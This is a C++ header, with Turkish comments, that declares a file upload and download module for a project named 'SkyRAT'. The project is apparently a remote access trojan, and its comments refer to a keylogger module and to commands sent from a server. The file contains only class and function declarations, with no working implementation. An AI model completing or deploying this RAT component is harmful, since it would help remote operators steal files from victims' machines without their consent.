#pragma once

// Proje yapısına uygun dahil edilen başlık dosyaları
#include "../IModule.h" 
#include "../../Utils/Logger.h" 
#include "../../Network/MessageProtocol.h" // msgpack için gerekli
#include <string>
#include <thread>
#include <functional>
#include <atomic>
#include <mutex>
#include <filesystem>
#include <winsock2.h> // SOCKET tipi için

namespace fs = std::filesystem;

// --- Cross-Platform Socket Definitions (Orijinal dosyanızdan alındı) ---
#ifdef _WIN32
    // Windows için gerekli
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
    typedef SOCKET SocketType;
    #define CLOSE_SOCKET closesocket
#else
    // Linux/Diğerleri için gerekli
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    typedef int SocketType;
    #define INVALID_SOCKET -1
    #define SOCKET_ERROR -1
    #define CLOSE_SOCKET close
#endif
// ---------------------------------------------------------------------------------


namespace SkyRAT {
namespace Modules {
namespace Implementations {

/**
 * @brief Cross-platform module for file data transfer (Client Mode).
 */
class DataTransferModule : public IModule {
public:
    /// Progress callback type (percentage, transferred bytes, total bytes)
    using ProgressCallback = std::function<void(int, long long, long long)>;

    DataTransferModule();
    virtual ~DataTransferModule();

    // --- IModule Interface Implementation (Keylogger ile aynı) ---
    std::string getName() const override { return "DataTransferModule"; }
    std::string getVersion() const override { return "1.0.0"; }
    bool initialize() override;
    void shutdown() override;
    bool isRunning() const override;
    bool start(SOCKET socket) override; // Server'dan gelen ilk socket (Kullanmayacağız)
    bool stop() override;
    
    // Komut işleme (Server'dan gelen UPLOAD, DOWNLOAD komutlarını işler)
    bool processCommand(const std::string& command, SOCKET socket) override;
    std::string getStatus() const override;
    bool canHandleCommand(const std::string& command) const override;
    bool executeCommand(const std::string& command, const std::vector<std::string>& arguments, SOCKET socket) override;
    std::vector<std::string> getSupportedCommands() const override;
    // ----------------------------------------

private:
    // --- Core Client API Functions (Orijinal dosyanızdan uyarlanmıştır) ---
    bool connectToServer(const std::string& ip, int port);
    bool uploadFile(const std::string& localPath, const std::string& remoteName = "");
    bool downloadFile(const std::string& remoteName, const std::string& localPath = "");
    void disconnect(); 
    void setProgressCallback(ProgressCallback callback);

    // --- Private State and Helpers ---
    static constexpr size_t BufferSize = 8192;
    static constexpr size_t MAX_FILE_SIZE = 10ULL * 1024 * 1024 * 1024;
    
    // Socket İşlemleri
    bool sendAll(SocketType sock, const char* data, size_t length);
    bool recvAll(SocketType sock, char* buffer, size_t length);
    
    // Yardımcılar
    void notifyProgress(int percentage, long long transferred, long long total);
    std::string sanitizeFileName(const std::string& fileName);
    bool isInitialized() const;
    int getLastError() const;
    
    // State Variables
    std::atomic<bool> isConnected_{false};     
    std::atomic<bool> isTransferring_{false};
    std::atomic<bool> shouldStop_{false};      
    
    SocketType clientSocket_{INVALID_SOCKET};  // Ayrı bağlantı için kullanılan socket
    
    std::shared_ptr<Utils::Logger> m_logger;
    ProgressCallback progressCallback_;
    std::mutex callbackMutex_;
    
#ifdef _WIN32
    WSADATA wsaData_;
    bool wsaInitialized_ = false;
#endif
};

} // namespace Implementations
} // namespace Modules
} // namespace SkyRAT
